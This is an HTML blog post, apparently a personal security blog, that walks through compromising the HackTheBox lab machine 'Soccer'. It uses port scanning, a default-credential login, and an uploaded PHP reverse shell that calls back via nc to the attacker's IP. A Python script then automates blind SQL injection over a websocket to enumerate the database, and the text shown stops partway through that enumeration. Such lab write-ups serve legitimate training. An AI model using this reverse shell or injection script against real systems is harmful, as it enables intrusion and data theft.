@@ -1,0 +1,874 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <!-- Head -->
+  <head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">    <!-- Metadata, OpenGraph and Schema.org -->
+    
+
+    <!-- Standard metadata -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Soccer | Will  Lindsey</title>
+    <meta name="author" content="Will  Lindsey">
+    <meta name="description" content="A walkthrough of HackTheBox's Soccer.">
+    <meta name="keywords" content="blog">
+
+
+    <!-- Bootstrap & MDB -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha256-DF7Zhf293AJxJNTmh5zhoYYIMs2oXitRfBjY+9L//AY=" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous">
+
+    <!-- Fonts & Icons -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/academicons@1.9.1/css/academicons.min.css" integrity="sha256-i1+4qU2G2860dGGIOJscdC30s9beBXjFfzjWLjBRsBg=" crossorigin="anonymous">
+    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons">
+
+    <!-- Code Syntax Highlighting -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/jwarby/jekyll-pygments-themes@master/github.css" media="" id="highlight_theme_light">
+
+    <!-- Styles -->
+    
+    <link rel="shortcut icon" href="data:image/svg+xml,&lt;svg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20100%20100%22&gt;&lt;text%20y=%22.9em%22%20font-size=%2290%22&gt;%F0%9F%92%BB&lt;/text&gt;&lt;/svg&gt;">
+    
+    <link rel="stylesheet" href="/assets/css/main.css">
+    <link rel="canonical" href="https://blog.anotherplacein.com/blog/2023/soccer/">
+    
+    <!-- Dark Mode -->
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/jwarby/jekyll-pygments-themes@master/native.css" media="none" id="highlight_theme_dark">
+
+    <script src="/assets/js/theme.js"></script>
+    <script src="/assets/js/dark_mode.js"></script>
+    
+
+  </head>
+
+  <!-- Body -->
+  <body class="fixed-top-nav ">
+
+    <!-- Header -->
+    <header>
+
+      <!-- Nav Bar -->
+      <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top">
+        <div class="container">
+          <a class="navbar-brand title font-weight-lighter" href="/"><span class="font-weight-bold">Will </span>Lindsey</a>
+          <!-- Navbar Toggle -->
+          <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
+            <span class="sr-only">Toggle navigation</span>
+            <span class="icon-bar top-bar"></span>
+            <span class="icon-bar middle-bar"></span>
+            <span class="icon-bar bottom-bar"></span>
+          </button>
+
+          <div class="collapse navbar-collapse text-right" id="navbarNav">
+            <ul class="navbar-nav ml-auto flex-nowrap">
+
+              <!-- About -->
+              <li class="nav-item ">
+                <a class="nav-link" href="/">about</a>
+              </li>
+              
+              <!-- Blog -->
+              <li class="nav-item active">
+                <a class="nav-link" href="/blog/">blog<span class="sr-only">(current)</span></a>
+              </li>
+
+              <!-- Other pages -->
+
+              <!-- Toogle theme mode -->
+              <li class="toggle-container">
+                <button id="light-toggle" title="Change theme">
+                  <i class="fas fa-moon"></i>
+                  <i class="fas fa-sun"></i>
+                </button>
+              </li>
+            </ul>
+          </div>
+        </div>
+      </nav>
+
+      <!-- Scrolling Progress Bar -->
+      <progress id="progress" value="0">
+        <div class="progress-container">
+          <span class="progress-bar"></span>
+        </div>
+      </progress>
+    </header>
+
+
+    <!-- Content -->
+    <div class="container mt-5">
+      <!-- _layouts/post.html -->
+
+<div class="post">
+
+  <header class="post-header">
+    <h1 class="post-title">Soccer</h1>
+    <p class="post-meta">June 6, 2023</p>
+    <p class="post-tags">
+      <a href="/blog/2023"> <i class="fas fa-calendar fa-sm"></i> 2023 </a>
+        ·  
+        <a href="/blog/tag/hack-the-box">
+          <i class="fas fa-hashtag fa-sm"></i> hack-the-box</a>  
+          <a href="/blog/tag/easy">
+          <i class="fas fa-hashtag fa-sm"></i> easy</a>  
+          
+        ·  
+        <a href="/blog/category/sqli">
+          <i class="fas fa-tag fa-sm"></i> SQLi</a>  
+          
+
+    </p>
+  </header>
+
+  <article class="post-content">
+    <h2 id="introduction">Introduction</h2>
+<p>Hack the Box is one of the cybersecurity upskilling platforms I use for professional development. Roughly once a week, Hack the Box releases a new vulnerable box for users to hack. Additionally, one active box is retired every week. Below is a walkthrough on compromising the recently retired box, “Soccer.”</p>
+
+<h2 id="summary">Summary</h2>
+<p><a href="https://hackthebox.com/machines/soccer" rel="external nofollow noopener" target="_blank">Soccer Hack The Box</a></p>
+
+<p>Soccer is hosting a website that exposes a website admin login page still configured with default credentials. Once I log in, I am able to upload a PHP file, granting me RCE (Remote Code Execution) on the box. While enumerating the box, I come across a new subdomain of the website. Upon exploring the subdomain, I discover a blind, boolean-based SQL injection vulnerability, which I exploit to obtain the user’s credentials. Logged in as a user, I find that “doas” is configured to allow me to run “dstat”. This configuration enables me to obtain a root shell.</p>
+
+<h2 id="port-scanning">Port Scanning</h2>
+
+<p><code class="language-plaintext highlighter-rouge">nmap</code> finds TCP ports 22, 80 and 9091 open.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">┌──(kali 🛸 box)-[~/workSpace/Boxes/Soccer]
+</span><span class="gp">└─$</span><span class="w"> </span>nmap 10.10.11.194                                                                                                                                             
+<span class="go">Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-18 13:49 EDT
+Nmap scan report for 10.10.11.194
+Host is up (0.027s latency).
+Not shown: 997 closed tcp ports (conn-refused)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+9091/tcp open  xmltec-xmlmail</span></code></pre></figure>
+
+<h2 id="enumerating-port-80">Enumerating port 80</h2>
+<h3 id="web-browser">Web Browser</h3>
+<p>Navigating to <code class="language-plaintext highlighter-rouge">http://10.10.11.194</code> I am redirected to soccer.htb.  I add soccer.htb to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> and reload the page. I find the “HTB FootBall Club.”</p>
+<div class="text-center">
+    <div class="img-fluid">
+        <figure>
+
+  <picture>
+    
+
+    <!-- Fallback to the original file -->
+    <img src="/assets/img/s1.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" data-zoomable="" onerror="this.onerror=null; $('.responsive-img-srcset').remove();">
+
+  </picture>
+
+</figure>
+
+    </div>
+</div>
+<p>Looking around the website doesn’t give any interesting results.</p>
+
+<h3 id="directory-enumeration">Directory Enumeration</h3>
+<p>I use <code class="language-plaintext highlighter-rouge">gobuster</code> and the word list <code class="language-plaintext highlighter-rouge">directory-list-2.3-small.txt</code> to discover the directory tiny.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">┌──(kali box)-[~/workSpace/Boxes/Soccer/httpsoccer.htb]
+</span><span class="gp">└─$</span><span class="w"> </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://soccer.htb/ <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 
+<span class="go">===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://soccer.htb/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.5
+[+] Timeout:                 10s
+===============================================================
+2023/06/18 14:20:40 Starting gobuster in directory enumeration mode
+===============================================================
+</span><span class="gp">/tiny                 (Status: 301) [Size: 178] [--&gt;</span><span class="w"> </span>http://soccer.htb/tiny/]
+<span class="go">Progress: 87591 / 87665 (99.92%)
+===============================================================
+2023/06/18 14:24:23 Finished
+===============================================================</span></code></pre></figure>
+
+<p>Visiting <code class="language-plaintext highlighter-rouge">http://soccer.htb/tiny/</code> I encounter a login screen.</p>
+<div class="text-center">
+    <div class="img-fluid">
+        <figure>
+
+  <picture>
+    
+
+    <!-- Fallback to the original file -->
+    <img src="/assets/img/s2.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" data-zoomable="" onerror="this.onerror=null; $('.responsive-img-srcset').remove();">
+
+  </picture>
+
+</figure>
+
+    </div>
+</div>
+
+<p>Googling “Tiny File Manager default credentials” I find <code class="language-plaintext highlighter-rouge">admin:admin@123</code>.  I am able to login with these credentials!</p>
+
+<div class="text-center">
+    <div class="img-fluid">
+        <figure>
+
+  <picture>
+    
+
+    <!-- Fallback to the original file -->
+    <img src="/assets/img/s3.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" data-zoomable="" onerror="this.onerror=null; $('.responsive-img-srcset').remove();">
+
+  </picture>
+
+</figure>
+
+    </div>
+</div>
+
+<p>Looking around I discover I can upload a <code class="language-plaintext highlighter-rouge">php</code> file to the uploads directory.  This will allow me to obtain a foothold on the box.</p>
+
+<h2 id="foothold">Foothold</h2>
+
+<p>I upload the following php file to the uploads directory.  I then navigate to the file I uploaded to initiate my reverse shell.</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="s1">'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.3 9595&gt;/tmp/f'</span><span class="p">)</span><span class="cp">?&gt;</span></code></pre></figure>
+
+<div class="row mt-3">
+    <div class="col-sm mt-3 mt-md-0">
+        <figure>
+
+  <picture>
+    
+
+    <!-- Fallback to the original file -->
+    <img src="/assets/img/s4.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" data-zoomable="" onerror="this.onerror=null; $('.responsive-img-srcset').remove();">
+
+  </picture>
+
+</figure>
+
+    </div>
+    <div class="col-sm mt-3 mt-md-0">
+        <figure>
+
+  <picture>
+    
+
+    <!-- Fallback to the original file -->
+    <img src="/assets/img/s5.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" data-zoomable="" onerror="this.onerror=null; $('.responsive-img-srcset').remove();">
+
+  </picture>
+
+</figure>
+
+    </div>
+</div>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">┌──(kali box)-[~/workSpace/Boxes/Soccer]
+</span><span class="gp">└─$</span><span class="w"> </span>nc <span class="nt">-lvnp</span> 9595
+<span class="go">listening on [any] 9595 ...
+connect to [10.10.14.3] from (UNKNOWN) [10.10.11.194] 59412
+</span><span class="gp">/bin/sh: 0: can't access tty;</span><span class="w"> </span>job control turned off
+<span class="gp">$</span><span class="w"> </span>python3 <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash");'</span>
+<span class="gp">www-data@soccer:~/html/tiny/uploads$</span><span class="w"> </span>^Z
+<span class="go">zsh: suspended  nc -lvnp 9595
+┌──(kali box)-[~/workSpace/Boxes/Soccer]
+</span><span class="gp">└─$</span><span class="w"> </span><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span> % 1                                                                                                                                                                                                          148 ⨯ 1 ⚙
+<span class="go">[1]  + continued  nc -lvnp 9595
+                               export TERM=screen
+</span><span class="gp">www-data@soccer:~/html/tiny/uploads$</span><span class="w"> </span><span class="nb">whoami</span>
+<span class="go">www-data
+</span><span class="gp">www-data@soccer:~/html/tiny/uploads$</span></code></pre></figure>
+
+<h2 id="user">User</h2>
+<p>From here I ran <a href="https://github.com/carlospolop/PEASS-ng/releases/tag/20230618-1fa055b6" rel="external nofollow noopener" target="_blank">linpeas</a>.  Looking through the output of linpease I noticed the subdomain <code class="language-plaintext highlighter-rouge">soc-player</code> in <code class="language-plaintext highlighter-rouge">/etc/hosts</code></p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">www-data@soccer:~/html/tiny/uploads$</span><span class="w"> </span><span class="nb">cat</span> /etc/hosts
+<span class="go">127.0.0.1       localhost       soccer  soccer.htb      soc-player.soccer.htb
+
+127.0.1.1       ubuntu-focal    ubuntu-focal</span></code></pre></figure>
+
+<p>Adding <code class="language-plaintext highlighter-rouge">soc-player.soccer.htb</code> to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> and navigating to the subdomain in my browser, I find a page similar to “HTB FootBall Club,” but with a Signup page.</p>
+
+<p>I sign up for an account.</p>
+<div class="text-center">
+    <div class="img-fluid">
+        <figure>
+
+  <picture>
+    
+
+    <!-- Fallback to the original file -->
+    <img src="/assets/img/s6.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" data-zoomable="" onerror="this.onerror=null; $('.responsive-img-srcset').remove();">
+
+  </picture>
+
+</figure>
+
+    </div>
+</div>
+
+<p>Signing in with the account I created, I am able to check for valid tickets.</p>
+
+<div class="row mt-3">
+    <div class="col-sm mt-3 mt-md-0">
+        <figure>
+
+  <picture>
+    
+
+    <!-- Fallback to the original file -->
+    <img src="/assets/img/s7.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" data-zoomable="" onerror="this.onerror=null; $('.responsive-img-srcset').remove();">
+
+  </picture>
+
+</figure>
+
+    </div>
+    <div class="col-sm mt-3 mt-md-0">
+        <figure>
+
+  <picture>
+    
+
+    <!-- Fallback to the original file -->
+    <img src="/assets/img/s8.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" data-zoomable="" onerror="this.onerror=null; $('.responsive-img-srcset').remove();">
+
+  </picture>
+
+</figure>
+
+    </div>
+</div>
+<p>Looking at the traffic in burp, I see that this feature is being accomplished using a websocket.  Now I see why this box is called soccer and not football!</p>
+<div class="text-center">
+    <div class="img-fluid">
+        <figure>
+
+  <picture>
+    
+
+    <!-- Fallback to the original file -->
+    <img src="/assets/img/s9.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" data-zoomable="" onerror="this.onerror=null; $('.responsive-img-srcset').remove();">
+
+  </picture>
+
+</figure>
+
+    </div>
+</div>
+<p>With a little help from <code class="language-plaintext highlighter-rouge">python's</code> websocket library we are able to discover a boolean based blind SQL injection.</p>
+
+<p><code class="language-plaintext highlighter-rouge">test.py</code></p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="n">websocket</span><span class="p">,</span> <span class="n">json</span>
+
+<span class="n">ws</span> <span class="o">=</span> <span class="n">websocket</span><span class="p">.</span><span class="nc">WebSocket</span><span class="p">()</span>
+<span class="n">ws</span><span class="p">.</span><span class="nf">connect</span><span class="p">(</span><span class="sh">"</span><span class="s">ws://soc-player.soccer.htb:9091</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">data</span> <span class="o">=</span><span class="p">{</span><span class="sh">"</span><span class="s">id</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">1</span><span class="sh">"</span><span class="p">}</span>  <span class="c1"># Normal data
+</span><span class="n">ws</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">)))</span>
+<span class="n">result</span> <span class="o">=</span> <span class="n">ws</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+<span class="nf">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+
+<span class="n">data</span> <span class="o">=</span><span class="p">{</span><span class="sh">"</span><span class="s">id</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">1 or 1=1</span><span class="sh">"</span><span class="p">}</span> <span class="c1"># Injecting boolean logic 
+</span><span class="n">ws</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">)))</span>
+<span class="n">result</span> <span class="o">=</span> <span class="n">ws</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+<span class="nf">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span></code></pre></figure>
+
+<p>Running the above code I see that I am able to inject sql logic.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">┌──(kali box)-[~/workSpace/Boxes/Soccer]
+</span><span class="gp">└─$</span><span class="w"> </span>python3 test.py
+<span class="go">Ticket Doesn't Exist
+Ticket Exists</span></code></pre></figure>
+
+<p>Using <a href="https://book.hacktricks.xyz/pentesting-web/sql-injection#identifying-back-end" rel="external nofollow noopener" target="_blank">HackTricks SQL-Injection Identifying Back-End</a> I determine that the backend is likely “MYSQL.”  I am going to take a moment here to explain how I can use this boolean injection to enumerate the database.</p>
+
+<p>Looking at this example, if the database begins with the letter a.  Then the result would be “Ticket Exists”.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">data</span> <span class="o">=</span><span class="p">{</span><span class="sh">"</span><span class="s">id</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">1 UNION SELECT 1,2,3 WHERE database() like </span><span class="sh">'</span><span class="s">a%</span><span class="sh">'"</span><span class="p">}</span> <span class="c1"># Checking to see if the database begins with the letter a
+</span><span class="n">ws</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">)))</span>
+<span class="n">result</span> <span class="o">=</span> <span class="n">ws</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+<span class="nf">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span></code></pre></figure>
+
+<p>Running the above code we see “Ticket Doesn’t Exists.”  This tells us that our above statements is false and therefore the database does not start with the letter a.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">┌──(kali box)-[~/workSpace/Boxes/Soccer]
+</span><span class="gp">└─$</span><span class="w"> </span>python3 test.py
+<span class="go">Ticket Doesn't Exist</span></code></pre></figure>
+
+<p>However, If we check if the database starts with the letter s, we receive “Ticket Exists.”</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">data</span> <span class="o">=</span><span class="p">{</span><span class="sh">"</span><span class="s">id</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">1 UNION SELECT 1,2,3 WHERE database() like </span><span class="sh">'</span><span class="s">s%</span><span class="sh">'"</span><span class="p">}</span> <span class="c1"># Checking to see if the database begins with the letter s
+</span><span class="n">ws</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">)))</span>
+<span class="n">result</span> <span class="o">=</span> <span class="n">ws</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+<span class="nf">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">┌──(kali box)-[~/workSpace/Boxes/Soccer]
+</span><span class="gp">└─$</span><span class="w"> </span>python3 test.py
+<span class="go">Ticket Exists</span></code></pre></figure>
+
+<p>Now that I know that the first letter of the database is s, I can loop through the alphabet to find the second letter.  If I did this I would find the second letter is “o.”</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">data</span> <span class="o">=</span><span class="p">{</span><span class="sh">"</span><span class="s">id</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">1 UNION SELECT 1,2,3 WHERE database() like </span><span class="sh">'</span><span class="s">so%</span><span class="sh">'"</span><span class="p">}</span> <span class="c1"># Checking to see if the database begins with the letters "so"
+</span><span class="n">ws</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">)))</span>
+<span class="n">result</span> <span class="o">=</span> <span class="n">ws</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+<span class="nf">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">┌──(kali box)-[~/workSpace/Boxes/Soccer]
+</span><span class="gp">└─$</span><span class="w"> </span>python3 test.py
+<span class="go">Ticket Exists</span></code></pre></figure>
+
+<p>Rather than doing this manually, I wrote a python script to automate this enumeration.</p>
+
+<p><code class="language-plaintext highlighter-rouge">soccer_sqli.py</code></p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="n">websocket</span><span class="p">,</span><span class="n">json</span><span class="p">,</span> <span class="n">sys</span>
+<span class="sh">"""</span><span class="s">
+Example Usage
+
+python3 soccer_sqli.py </span><span class="sh">"</span><span class="s">WHERE database() like </span><span class="sh">'</span><span class="s">__loop__%</span><span class="sh">'"</span><span class="s"> f
+
+</span><span class="sh">"""</span>
+
+<span class="n">alpha_b</span> <span class="o">=</span> <span class="sh">"</span><span class="s">q w e r t y u i o p a s d f g h j k l z x c v b n m 0 1 2 3 4 5 6 7 8 9 _ -</span><span class="sh">"</span>
+<span class="n">alpha_b_list</span> <span class="o">=</span> <span class="n">alpha_b</span><span class="p">.</span><span class="nf">split</span><span class="p">()</span>
+<span class="n">ALPHA_B</span> <span class="o">=</span> <span class="sh">"</span><span class="s">Q W E R T Y U I O P A S D F G H J K L Z X C V B N M q w e r t y u i o p a s d f g h j k l z x c v b n m 0 1 2 3 4 5 6 7 8 9 ! @ # $ ^ &amp; * ( ) ? &gt; &lt; , . [ ] { } _ -</span><span class="sh">"</span>
+<span class="n">ALPHA_B_LIST</span> <span class="o">=</span> <span class="n">ALPHA_B</span><span class="p">.</span><span class="nf">split</span><span class="p">()</span>
+
+
+<span class="k">def</span> <span class="nf">get_from_db</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">replacement_text</span><span class="p">,</span> <span class="n">full_list</span><span class="o">=</span><span class="bp">False</span><span class="p">):</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="nf">dict</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">payload</span><span class="p">[</span><span class="sh">'</span><span class="s">id</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="n">payload</span><span class="p">[</span><span class="sh">'</span><span class="s">id</span><span class="sh">'</span><span class="p">].</span><span class="nf">replace</span><span class="p">(</span><span class="sh">"</span><span class="s">__replace__</span><span class="sh">"</span><span class="p">,</span> <span class="n">replacement_text</span><span class="p">)</span>
+    <span class="n">ws</span> <span class="o">=</span> <span class="n">websocket</span><span class="p">.</span><span class="nc">WebSocket</span><span class="p">()</span>
+    <span class="n">ws</span><span class="p">.</span><span class="nf">connect</span><span class="p">(</span><span class="sh">"</span><span class="s">ws://soc-player.soccer.htb:9091</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">end_of_word</span> <span class="o">=</span> <span class="bp">False</span>
+    <span class="n">this_word</span> <span class="o">=</span> <span class="sh">""</span>
+    <span class="k">if</span> <span class="n">full_list</span><span class="p">:</span>
+        <span class="n">letter_list</span> <span class="o">=</span> <span class="n">ALPHA_B_LIST</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">letter_list</span> <span class="o">=</span> <span class="n">alpha_b_list</span>
+
+    <span class="k">while</span> <span class="ow">not</span> <span class="n">end_of_word</span><span class="p">:</span>
+        <span class="n">end_of_word</span> <span class="o">=</span> <span class="bp">True</span>        
+        <span class="n">found_letter</span><span class="o">=</span><span class="bp">False</span>
+        <span class="k">for</span> <span class="n">letter</span> <span class="ow">in</span> <span class="n">letter_list</span><span class="p">:</span>
+            <span class="n">current_word</span> <span class="o">=</span> <span class="n">this_word</span> <span class="o">+</span> <span class="n">letter</span>
+            
+            
+            <span class="n">d</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">id</span><span class="sh">"</span><span class="p">:</span> <span class="n">payload</span><span class="p">[</span><span class="sh">'</span><span class="s">id</span><span class="sh">'</span><span class="p">].</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="s">__loop__</span><span class="sh">'</span><span class="p">,</span> <span class="n">current_word</span><span class="p">)}</span>
+
+            <span class="n">data</span> <span class="o">=</span> <span class="nf">str</span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="n">d</span><span class="p">))</span>
+            <span class="n">ws</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+            <span class="n">result</span> <span class="o">=</span> <span class="n">ws</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+            
+            <span class="k">if</span> <span class="n">result</span> <span class="o">==</span><span class="sh">"</span><span class="s">Ticket Exists</span><span class="sh">"</span> <span class="ow">and</span> <span class="n">found_letter</span> <span class="o">==</span> <span class="bp">False</span><span class="p">:</span>
+                <span class="n">this_word</span> <span class="o">=</span> <span class="n">this_word</span> <span class="o">+</span> <span class="n">letter</span>
+                <span class="n">found_letter</span> <span class="o">=</span> <span class="bp">True</span>
+                <span class="n">end_of_word</span> <span class="o">=</span> <span class="bp">False</span>
+                <span class="nf">print</span><span class="p">(</span><span class="n">this_word</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">this_word</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">id</span><span class="sh">"</span><span class="p">:</span> <span class="sa">f</span><span class="sh">"</span><span class="s">1 UNION SELECT 1,2,3 __replace__-- -</span><span class="sh">"</span><span class="p">}</span>
+
+<span class="n">inject</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="k">if</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">].</span><span class="nf">lower</span><span class="p">()</span> <span class="o">==</span><span class="sh">'</span><span class="s">t</span><span class="sh">'</span><span class="p">:</span>
+    <span class="nf">get_from_db</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">inject</span><span class="p">,</span> <span class="n">full_list</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="nf">get_from_db</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">inject</span><span class="p">)</span></code></pre></figure>
+
+<p>First I get the name of the database I am currently working in.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">┌──(kali box)-[~/workSpace/Boxes/Soccer]
+</span><span class="gp">└─$</span><span class="w"> </span>python3 soccer_sqli.py <span class="s2">"WHERE database() like '__loop__%'"</span> f
+<span class="go">s
+so
+soc
+socc
+socce
+soccer
+soccer_
+soccer_d
+soccer_db</span></code></pre></figure>
+
+<p>Now I use my script to look for tables in soccer_db.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">┌──(kali box)-[~/workSpace/Boxes/Soccer]
+</span><span class="gp">└─$</span><span class="w"> </span>python3 soccer_sqli.py <span class="s2">"FROM information_schema.tables where table_schema = 'soccer_db' and table_name like '__loop__%'"</span> f
+<span class="go">a
+ac
+acc
+acco
+accou
+accoun
+account
+accounts
+┌──(kali box)-[~/workSpace/Boxes/Soccer]
+</span><span class="gp">└─$</span><span class="w"> </span>python3 soccer_sqli.py <span class="s2">"FROM information_schema.tables where table_schema = 'soccer_db' and table_name like '__loop__%' and table_name != 'accounts'"</span> f
+<span class="go">┌──(kali box)-[~/workSpace/Boxes/Soccer]
+</span><span class="gp">└─$</span><span class="w"> </span></code></pre></figure>
+
+<p>I find only one table <code class="language-plaintext highlighter-rouge">accounts</code>.  Now I can find the columns in that table.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">┌──(kali box)-[~/workSpace/Boxes/Soccer]
+</span><span class="gp">└─$</span><span class="w"> </span>python3 soccer_sqli.py <span class="s2">"FROM information_schema.COLUMNS where table_schema = 'soccer_db' and table_name='accounts' and COLUMN_NAME like '__loop__%'"</span> f 
+<span class="go">e
+em
+ema
+emai
+email
+┌──(kali box)-[~/workSpace/Boxes/Soccer]
+</span><span class="gp">└─$</span><span class="w"> </span>python3 soccer_sqli.py <span class="s2">"FROM information_schema.COLUMNS where table_schema = 'soccer_db' and table_name='accounts' and COLUMN_NAME like '__loop__%' and COLUMN_NAME != 'email'"</span> f
+<span class="go">u
+us
+use
+user
+usern
+userna
+usernam
+username
+┌──(kali box)-[~/workSpace/Boxes/Soccer]
+</span><span class="gp">└─$</span><span class="w"> </span>python3 soccer_sqli.py <span class="s2">"FROM information_schema.COLUMNS where table_schema = 'soccer_db' and table_name='accounts' and COLUMN_NAME like '__loop__%' and COLUMN_NAME != 'email' and COLUMN_NAME != 'username'"</span> f
+<span class="go">i
+id
+┌──(kali box)-[~/workSpace/Boxes/Soccer]
